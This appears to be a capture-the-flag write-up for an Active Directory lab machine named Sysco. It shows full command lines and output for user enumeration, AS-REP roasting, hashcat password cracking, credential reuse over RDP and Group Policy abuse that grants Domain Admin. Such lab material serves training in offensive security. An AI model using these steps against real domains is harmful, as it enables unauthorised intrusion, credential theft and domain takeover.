---
cover: ../.gitbook/assets/fa0835e6-e964-4b7b-ad0a-dd2b290e225b.png
coverY: 0
---

# Sysco(AD)

## Initial Enumeration :

### NMAP :

```powershell
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Apache httpd 2.4.58 ((Win64) OpenSSL/3.1.3 PHP/8.2.12)
| http-methods: 
|   Supported Methods: OPTIONS HEAD GET POST TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.2.12
|_http-title: Index - Sysco MSP
|_http-favicon: Unknown favicon MD5: DD229045B1B32B2F2407609235A23238
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-06-16 23:35:30Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: SYSCO.LOCAL, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 126
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: SYSCO.LOCAL, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 126
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
|_ssl-date: 2026-06-16T23:37:11+00:00; +3s from scanner time.
| ssl-cert: Subject: commonName=DC01.SYSCO.LOCAL
| Issuer: commonName=DC01.SYSCO.LOCAL
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-05-29T23:45:47
| Not valid after:  2026-11-28T23:45:47
| MD5:     ec3f 1383 3b82 1210 ec5f fbc1 f012 8e2c
| SHA-1:   ac7f a447 80ce 719e 96b4 2609 c6a5 6529 26bd 048b
| SHA-256: cc9b d77d 4e58 dc75 242b e3ea ed22 7aae db56 dacc 09ee a72f 5059 c17a 0798 f14e
| -----BEGIN CERTIFICATE-----
| MIIC5DCCAcygAwIBAgIQOlnNPWy2kJtH5je7FCEk5jANBgkqhkiG9w0BAQsFADAb
| MRkwFwYDVQQDExBEQzAxLlNZU0NPLkxPQ0FMMB4XDTI2MDUyOTIzNDU0N1oXDTI2
| MTEyODIzNDU0N1owGzEZMBcGA1UEAxMQREMwMS5TWVNDTy5MT0NBTDCCASIwDQYJ
| KoZIhvcNAQEBBQADggEPADCCAQoCggEBALoF0pbGgY0OEVNx1V9zqV7WuegfDYY/
| 7QbdHPBJaVh9pKQQqhXHyWI+3gPCGKIY/aWiwLruVCjyVdxs0HbNF7ptEbb6pT49
| ayG+K0Cg+xPQLhKDD0QEjSC1i0hoWyjpehRKq+MGxtJgDfG0k9ihAnVNGddwtnbJ
| IcajqiO6oIvLIUyS+x1tWYOnNq+g4R+LhGLgc64OaSgZ4+nQAwGahMIxOsuseLmg
| ypqzEG1DO1JzITU5n7qSvVqZctdQSwVN9TFX0i05MXG7PzrabQpTJSomtlTxis52
| m21J8kPb5NE8CjZSsdVJZ2kP4uN6HYwLpf7J5a2oL+/mJfWk0DxThsECAwEAAaMk
| MCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0PBAQDAgQwMA0GCSqGSIb3DQEB
| CwUAA4IBAQBb+j7/N75+DsdG2m9TaofBhYXV+SN6RBHsi2JGNRc4C4IRmRENkKHK
| +nxyYS9gzB/L35Z7Ekmv/E61mnnL2uyUQdHRCLcWUVYOAUeNWtQlMbKuql99m2CA
| PwpLHeF+3025OdyGa/grdy/0LiV4mWlLbyuh7oA2NhEpEjuKxD+ftQ0Xg3YruG9n
| jJAFgkX6eNckVPSUMtzgVN327X+l7OAKtQIW97nseFJJA5HSZ/apB583mOwJBbRD
| 6gJgDev5crYRjGvGxD0ohGAghihqSdF5dO1p6iaDrQyTJa3aox8gong7Hx3hGcTP
| gDmHyPgjXFYJ6A3Dz7bpvUtRFYTdxoKg
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: SYSCO
|   NetBIOS_Domain_Name: SYSCO
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SYSCO.LOCAL
|   DNS_Computer_Name: DC01.SYSCO.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2026-06-16T23:36:33+00:00
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49673/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49681/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49699/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49730/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
```

#### Port 80 (web server) :

* Since we saw port 80 open on the server we go ahead and see what’s running on the web server.

<figure><img src="../.gitbook/assets/image (97).png" alt=""><figcaption></figcaption></figure>

* We saw a the web server so we started enumerating the site to see if we can find something interesting.
* Interestingly, We found some names provided so I thought we could use these.

<figure><img src="../.gitbook/assets/image (98).png" alt=""><figcaption></figcaption></figure>

* Now we use a save these names in a text file named `prob_users.txt` and then use a username generator script to find the right username.

{% embed url="https://github.com/florianges/UsernameGenerator" %}

```powershell
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/sysco/UsernameGenerator]
└─$ python3 UsernameGenerator.py ../prob_users.txt ../users_probable.txt
UsernameGenerator.py - Simple username generator based on a list of name and surname
------------------------------------------------------
Input file: ../prob_users.txt
Output file: ../users_probable.txt
------------------------------------------------------
Usernames written to output file ../users_probable.txt
Number of users created: 208
------------------------------------------------------
```

* Now we will use a tool `kerbrute` to find valid username

```powershell
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/sysco]
└─$ ./kerbrute_linux_amd64 userenum -d sysco.local --dc 10.1.55.144 users_probable.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 06/17/26 - Ronnie Flathers @ropnop

2026/06/17 05:12:27 >  Using KDC(s):
2026/06/17 05:12:27 >   10.1.55.144:88

2026/06/17 05:12:27 >  [+] VALID USERNAME:       greg.shields@sysco.local
2026/06/17 05:12:27 >  [+] VALID USERNAME:       Greg.Shields@sysco.local
2026/06/17 05:12:30 >  [+] VALID USERNAME:       jack.dowland@sysco.local
2026/06/17 05:12:30 >  [+] VALID USERNAME:       Jack.Dowland@sysco.local
2026/06/17 05:12:31 >  [+] VALID USERNAME:       lainey.moore@sysco.local
2026/06/17 05:12:31 >  [+] VALID USERNAME:       Lainey.Moore@sysco.local
```

* we found 3 valid users of the domain so we can use these for further enumeration.

#### SMB(135,139,445) :

* Since we saw these ports open we try to access the machine with a null session

```powershell
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/sysco]
└─$ nxc smb sysco.local -u '' -p ''
SMB         10.1.55.144     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SYSCO.LOCAL) (signing:True) (SMBv1:False)
SMB         10.1.55.144     445    DC01             [+] SYSCO.LOCAL\:
```

* we could see that the `null` session worked, so now we try to list out shares to see if it works.

```powershell
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/sysco]
└─$ nxc smb sysco.local -u '' -p '' --shares
SMB         10.1.55.144     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SYSCO.LOCAL) (signing:True) (SMBv1:False)
SMB         10.1.55.144     445    DC01             [+] SYSCO.LOCAL\: 
SMB         10.1.55.144     445    DC01             [-] Error enumerating shares: STATUS_ACCESS_DENIED
                                                                                                      
```

* We get an `Access Denied` which means we cannot access the shares with a null sesion.
* Now we already have a list of users so a possible attack path is `asreproasting` which could be tried.

## Compromising user `jack.dowland` :

* We first tried to `AS-REP Roast` by using the user `greg.shield` but didn’t work.

<figure><img src="../.gitbook/assets/image (99).png" alt=""><figcaption></figcaption></figure>

* Now we tried it with the user `jack.dowland` and we successfully retrieved a hash and now we can go ahead and crack it.

```powershell
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/sysco]
└─$ nxc ldap sysco.local -u 'jack.dowland' -p '' --asreproast out.txt
LDAP        10.1.55.144     389    DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:SYSCO.LOCAL) (signing:None) (channel binding:No TLS cert)
LDAP        10.1.55.144     389    DC01             $krb5asrep$23$jack.dowland@SYSCO.LOCAL:9ef8060f7a44d27620884e6e01da71b6$26ebe72274e416b0b400757be263e3cae48496ed3daa1bc76a9d85df07329dfecb2606f07a8520a2ffdc06cbfbb0039402741b8145bbd9d12b0a2c0c0d54ea21134c895c8faa9986a36787f321041a7c9fa0012980b8861118fbc21331ffab1a47dff489a770040a4d4582ee3041d3a5520de5b876043b2fd55f3339f9f078e058fb19085036aa65820dfa5ccbd1b31e3b8e626f80b2595e71e8bc236908e188d80acb3f47fde91ed740c1f2ec6511316c73525cb341b9ee2ab4a0d0ca82ceab2b3aa4bb7d20ab4363dae7c7beb47d61ea277b7f77cb3f9945e5ef0d448a513dab5c39660e64449c9df5
```

* We crack it using `hashcat` .

```powershell
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/sysco]
└─$ hashcat out.txt /usr/share/wordlists/rockyou.txt          
hashcat (v7.1.2) starting in autodetect mode

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 5700U with Radeon Graphics, 2210/4420 MB (1024 MB allocatable), 4MCU

Hash-mode was not specified with -m. Attempting to auto-detect hash mode.
The following mode was auto-detected as the only one matching your input hash:

18200 | Kerberos 5, etype 23, AS-REP | Network Protocol

NOTE: Auto-detect is best effort. The correct hash-mode is NOT guaranteed!
Do NOT report auto-detect issues unless you are certain of the hash type.

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (3097 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$jack.dowland@SYSCO.LOCAL:9ef8060f7a44d27620884e6e01da71b6$26ebe72274e416b0b400757be263e3cae48496ed3daa1bc76a9d85df07329dfecb2606f07a8520a2ffdc06cbfbb0039402741b8145bbd9d12b0a2c0c0d54ea21134c895c8faa9986a36787f321041a7c9fa0012980b8861118fbc21331ffab1a47dff489a770040a4d4582ee3041d3a5520de5b876043b2fd55f3339f9f078e058fb19085036aa65820dfa5ccbd1b31e3b8e626f80b2595e71e8bc236908e188d80acb3f47fde91ed740c1f2ec6511316c73525cb341b9ee2ab4a0d0ca82ceab2b3aa4bb7d20ab4363dae7c7beb47d61ea277b7f77cb3f9945e5ef0d448a513dab5c39660e64449c9df5:musicman1
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$jack.dowland@SYSCO.LOCAL:9ef8060f7a44...9c9df5
Time.Started.....: Wed Jun 17 05:32:52 2026 (1 sec)
Time.Estimated...: Wed Jun 17 05:32:53 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:   682.9 kH/s (3.01ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 69632/14344385 (0.49%)
Rejected.........: 0/69632 (0.00%)
Restore.Point....: 65536/14344385 (0.46%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: ryanscott -> 03121992
Hardware.Mon.#01.: Util: 21%

Started: Wed Jun 17 05:32:45 2026
Stopped: Wed Jun 17 05:32:54 2026
```

* we now successfully got a valid user creds

```powershell
jack.dowland:musicman1
```

* We confirm the access using `netexec`.

```powershell
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/sysco]
└─$ nxc smb sysco.local -u 'jack.dowland' -p 'musicman1'                      
SMB         10.1.55.144     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SYSCO.LOCAL) (signing:True) (SMBv1:False)
SMB         10.1.55.144     445    DC01             [+] SYSCO.LOCAL\jack.dowland:musicman1
```

* Now we see if this users has access to any interesting shares

```powershell
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/sysco]
└─$ nxc smb sysco.local -u 'jack.dowland' -p 'musicman1' --shares
SMB         10.1.55.144     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SYSCO.LOCAL) (signing:True) (SMBv1:False)
SMB         10.1.55.144     445    DC01             [+] SYSCO.LOCAL\jack.dowland:musicman1 
SMB         10.1.55.144     445    DC01             [*] Enumerated shares
SMB         10.1.55.144     445    DC01             Share           Permissions     Remark
SMB         10.1.55.144     445    DC01             -----           -----------     ------
SMB         10.1.55.144     445    DC01             ADMIN$                          Remote Admin
SMB         10.1.55.144     445    DC01             C$                              Default share
SMB         10.1.55.144     445    DC01             IPC$            READ            Remote IPC
SMB         10.1.55.144     445    DC01             NETLOGON        READ            Logon server share 
SMB         10.1.55.144     445    DC01             SYSVOL          READ            Logon server share 
```

* We do not see access to any interesting shares.
* Now we list all the users in the domain

```powershell
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/sysco]
└─$ nxc smb sysco.local -u 'jack.dowland' -p 'musicman1' --users 
SMB         10.1.55.144     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SYSCO.LOCAL) (signing:True) (SMBv1:False)
SMB         10.1.55.144     445    DC01             [+] SYSCO.LOCAL\jack.dowland:musicman1 
SMB         10.1.55.144     445    DC01             -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         10.1.55.144     445    DC01             Administrator                 2025-10-18 02:57:08 0       Built-in account for administering the computer/domain
SMB         10.1.55.144     445    DC01             Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         10.1.55.144     445    DC01             krbtgt                        2025-10-18 04:20:44 0       Key Distribution Center Service Account
SMB         10.1.55.144     445    DC01             jack.dowland                  2025-10-18 04:48:47 0       Helpdesk Tier 1
SMB         10.1.55.144     445    DC01             lainey.moore                  2025-10-18 04:50:14 0       System Engineer
SMB         10.1.55.144     445    DC01             greg.shields                  2025-10-18 04:51:59 1       System Administrator
SMB         10.1.55.144     445    DC01             [*] Enumerated 6 local users: SYSCO
```

* From here we could clearly see that the user `jack.dowland` is a Helpdesk Tier 1 group member.

## Bloodhound :

### COllecting Bloodhound Loot :

* Since we have a valid set of credential we go ahead and collect the bloodhound loot.
* we used `bloodyAD` to collect the loot.

```powershell
┌──(.venv)─(kali㉿kali)-[~/Desktop/Hacksmarter/sysco/bloodyAD]
└─$ python3 bloodyAD.py --host 10.1.55.144 -d sysco.local -u jack.dowland -p musicman1 get bloodhound
[+] Connecting to LDAP server
[+] Connected to LDAP serrver
Dumping schema: 2it [00:01,  1.92it/s]
Generating lookuptable: 79it [00:02, 35.02it/s]
Dumping SDs: 100%|██████████████████████████████████████████████████████████████████████████| 83/83 [00:20<00:00,  4.10it/s]
Dumping domains: 100%|████████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00,  1.25it/s]
Dumping users: 100%|██████████████████████████████████████████████████████████████████████████| 6/6 [00:00<00:00, 24.25it/s]
Dumping computers: 100%|██████████████████████████████████████████████████████████████████████| 1/1 [00:00<00:00,  4.35it/s]
Dumping groups: 100%|██████████████████████████████████████████████████████████████████████| 48/48 [00:00<00:00, 179.26it/s]
Dumping GPOs: 100%|███████████████████████████████████████████████████████████████████████████| 2/2 [00:00<00:00,  6.12it/s]
Dumping OUs: 100%|████████████████████████████████████████████████████████████████████████████| 2/2 [00:00<00:00,  8.64it/s]
Dumping Containers: 100%|███████████████████████████████████████████████████████████████████| 19/19 [00:00<00:00, 71.15it/s]
[+] Bloodhound data saved to 20260617T002152_Bloodhound.zip
[+] Found 0 trusts
```

* Now we go ahead and analyze it.

### Bloodhound Analysis :

* Upon Analysing we saw that our compromised user had no outbound object control.

<figure><img src="../.gitbook/assets/image (100).png" alt=""><figcaption></figcaption></figure>

* Since this user had no interesting privs so we started enumerating the Web server again to find if there is any hidden login
* we used `dirsearch`

```powershell
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/sysco]
└─$ dirsearch -u http://10.1.55.144/       
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3                                                   
 (_||| _) (/_(_|| (_| )                                                            
                                                                                   
Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25
Wordlist size: 11460

Output File: /home/kali/Desktop/Hacksmarter/sysco/reports/http_10.1.55.144/__26-06-17_06-10-46.txt

Target: http://10.1.55.144/

[06:10:46] Starting:                                                               
[06:10:50] 403 -  300B  - /%C0%AE%C0%AE%C0%AF                               
[06:10:50] 403 -  300B  - /%3f/                                             
[06:10:50] 403 -  300B  - /%ff                                              
[06:10:55] 403 -  300B  - /.ht_wsr.txt                                      
[06:10:55] 403 -  300B  - /.htaccess.bak1                                   
[06:10:55] 403 -  300B  - /.htaccess.orig                                   
[06:10:55] 403 -  300B  - /.htaccess.sample
[06:10:55] 403 -  300B  - /.htaccess.save
[06:10:55] 403 -  300B  - /.htaccess_extra                                  
[06:10:55] 403 -  300B  - /.htaccess_orig
[06:10:55] 403 -  300B  - /.htaccess_sc
[06:10:55] 403 -  300B  - /.htaccessBAK
[06:10:55] 403 -  300B  - /.htaccessOLD
[06:10:55] 403 -  300B  - /.htaccessOLD2
[06:10:55] 403 -  300B  - /.htm                                             
[06:10:55] 403 -  300B  - /.html                                            
[06:10:55] 403 -  300B  - /.htpasswd_test                                   
[06:10:55] 403 -  300B  - /.httr-oauth
[06:10:55] 403 -  300B  - /.htpasswds
[06:11:27] 301 -  335B  - /assets  ->  http://10.1.55.144/assets/           
[06:11:27] 200 -    2KB - /assets/
[06:11:32] 403 -  300B  - /cgi-bin/                                         
[06:11:38] 200 -    2KB - /cgi-bin/printenv.pl                              
[06:11:46] 503 -  400B  - /examples                                         
[06:11:46] 503 -  400B  - /examples/jsp/%252e%252e/%252e%252e/manager/html/ 
[06:11:46] 503 -  400B  - /examples/jsp/index.html
[06:11:46] 503 -  400B  - /examples/                                        
[06:11:46] 503 -  400B  - /examples/servlet/SnoopServlet
[06:11:46] 503 -  400B  - /examples/servlets/index.html                     
[06:11:46] 503 -  400B  - /examples/jsp/snp/snoop.jsp
[06:11:46] 503 -  400B  - /examples/servlets/servlet/CookieExample          
[06:11:46] 503 -  400B  - /examples/servlets/servlet/RequestHeaderExample
[06:11:46] 503 -  400B  - /examples/websocket/index.xhtml
[06:11:47] 301 -  334B  - /forms  ->  http://10.1.55.144/forms/             
[06:11:53] 403 -  300B  - /index.php::$DATA                                 
[06:12:10] 403 -  419B  - /phpmyadmin                                       
[06:12:11] 403 -  419B  - /phpmyadmin/                                      
[06:12:11] 403 -  419B  - /phpmyadmin/README                                
[06:12:11] 403 -  419B  - /phpmyadmin/docs/html/index.html
[06:12:11] 403 -  419B  - /phpmyadmin/scripts/setup.php
[06:12:11] 403 -  419B  - /phpmyadmin/phpmyadmin/index.php
[06:12:11] 403 -  419B  - /phpmyadmin/ChangeLog
[06:12:11] 403 -  419B  - /phpmyadmin/index.php
[06:12:11] 403 -  419B  - /phpmyadmin/doc/html/index.html                   
[06:12:15] 200 -  219B  - /README.TXT                                       
[06:12:15] 200 -  219B  - /README.txt
[06:12:16] 200 -  219B  - /Readme.txt
[06:12:16] 200 -  219B  - /ReadMe.txt
[06:12:16] 200 -  219B  - /readme.txt
[06:12:19] 403 -  419B  - /server-info                                      
[06:12:19] 403 -  419B  - /server-status
[06:12:19] 403 -  419B  - /server-status/
[06:12:29] 403 -  300B  - /Trace.axd::$DATA                                 
[06:12:30] 200 -    5KB - /roundcube/index.php                              
[06:12:35] 403 -  300B  - /web.config::$DATA                                
[06:12:35] 403 -  419B  - /webalizer                                        
[06:12:35] 403 -  419B  - /webalizer/                                       
                                                                             
Task Completed
```

## Compromising `Lainey.moore` :

* We found a `roundcube/index.php` which had a login page so we tried these credentials over there and it worked

<figure><img src="../.gitbook/assets/image (101).png" alt=""><figcaption></figcaption></figure>

* After log in, we landed at the page shown below.

<figure><img src="../.gitbook/assets/image (102).png" alt=""><figcaption></figcaption></figure>

* Now we started enumerating the site.
* We found a mail sent to `lainey.moore` which contained a router config file

<figure><img src="../.gitbook/assets/image (103).png" alt=""><figcaption></figcaption></figure>

* Now we go ahead and download it and see what is in there.

<figure><img src="../.gitbook/assets/image (104).png" alt=""><figcaption></figcaption></figure>

* We found an `MD5` Hash and then we cracked it with `Hacshcat` .

```powershell
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/sysco]
└─$ hashcat -m 500 '$1$mERr$isugnYiHsjHT.i.tc2GDY.' /usr/share/wordlists/rockyou.txt
hashcat (v7.1.2) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, SPIR-V, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
====================================================================================================================================================
* Device #01: cpu-haswell-AMD Ryzen 7 5700U with Radeon Graphics, 2209/4418 MB (1024 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256
Minimum salt length supported by kernel: 0
Maximum salt length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory allocated for this attack: 513 MB (1156 MB free)

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$1$mERr$isugnYiHsjHT.i.tc2GDY.:Chocolate1                 
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 500 (md5crypt, MD5 (Unix), Cisco-IOS $1$ (MD5))
Hash.Target......: $1$mERr$isugnYiHsjHT.i.tc2GDY.
Time.Started.....: Fri Jun 26 08:37:43 2026 (7 secs)
Time.Estimated...: Fri Jun 26 08:37:50 2026 (0 secs)
Kernel.Feature...: Pure Kernel (password length 0-256 bytes)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#01........:     8616 H/s (23.74ms) @ Accel:60 Loops:1000 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 59280/14344385 (0.41%)
Rejected.........: 0/59280 (0.00%)
Restore.Point....: 59040/14344385 (0.41%)
Restore.Sub.#01..: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#01...: MAGODEOZ -> 121102
Hardware.Mon.#01.: Util: 90%

Started: Fri Jun 26 08:36:30 2026
Stopped: Fri Jun 26 08:37:52 2026
```

* Now we check this password with `lainey.moore` user as this was sent to him.

```powershell
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/sysco]
└─$ nxc smb sysco.local -u lainey.moore -p 'Chocolate1'                    
SMB         10.1.55.144     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SYSCO.LOCAL) (signing:True) (SMBv1:False)
SMB         10.1.55.144     445    DC01             [+] SYSCO.LOCAL\lainey.moore:Chocolate1
```

* We do see that these are valid set of credentials and now we see the permissions in `Bloodhound` for this user.
* Interestingly, we found that this user is a member of `RDPUsers` Group.

<figure><img src="../.gitbook/assets/image (105).png" alt=""><figcaption></figcaption></figure>

* Now we try using `RDP` on the machine using these credentials.

<figure><img src="../.gitbook/assets/image (106).png" alt=""><figcaption></figcaption></figure>

* We were successfully able to RDP in the machine and got our user flag

<figure><img src="../.gitbook/assets/image (107).png" alt=""><figcaption></figcaption></figure>

## Compromising `Greg.Shields` :

* While enumerating the on the machine we found a `notes.txt` file on the machine

<figure><img src="../.gitbook/assets/image (108).png" alt=""><figcaption></figcaption></figure>

* There was a shortcut for `Putty-HS Router login` so we checked its properties and we found a password so we tried it with the the user `greg.shields` as he is also a member of `RDPUsers` group.

<figure><img src="../.gitbook/assets/image (109).png" alt=""><figcaption></figcaption></figure>

* We were successfully able to authenticate as `greg.shields` user.

```powershell
┌──(kali㉿kali)-[~/Desktop/Hacksmarter/sysco]
└─$ nxc smb sysco.local -u greg.shields -p '5y5coSmarter2025!!!'                    
SMB         10.1.55.144     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SYSCO.LOCAL) (signing:True) (SMBv1:False) 
SMB         10.1.55.144     445    DC01             [+] SYSCO.LOCAL\greg.shields:5y5coSmarter2025!!! 
```

* Now we check his permissions using `Bloodhound` .
* We saw that this user is a member of `Group Policy Creator` Group and has `GenericAll` permissions over the `Default Domain Policy` which could be abused

<figure><img src="../.gitbook/assets/image (110).png" alt=""><figcaption></figcaption></figure>

* We are using a tool named `pyGPOAbuse` and using it we add the user `greg.shields` to the `Domain Admins` group as I didn’t want to create a new user in the Domain for better OPSEC.

{% embed url="https://github.com/Hackndo/pyGPOAbuse.git" %}

```powershell
┌──(.venv)─(kali㉿kali)-[~/Desktop/Hacksmarter/sysco/pyGPOAbuse]
└─$ python3 pygpoabuse.py sysco.local/greg.shields:'5y5coSmarter2025!!!' -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 -taskname SecurityUpdate -dc-ip 10.1.55.144 -command 'net group "Domain Admins" greg.shields /add' -filter-enabled -target-dns-name dc01.sysco.local
[+] ScheduledTask SecurityUpdate created!
```

* Now we use the `gpupdate` command on the `RDP` access to update the group policy.

<figure><img src="../.gitbook/assets/image (111).png" alt=""><figcaption></figcaption></figure>

* Now we can go ahead open an administrative command prompt and collect our user flag

<figure><img src="../.gitbook/assets/image (112).png" alt=""><figcaption></figcaption></figure>

```powershell
C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt
e7f850e7c14aeae7ecbb900fb6afbba1
```

* We have now successfully solved this machine!!!
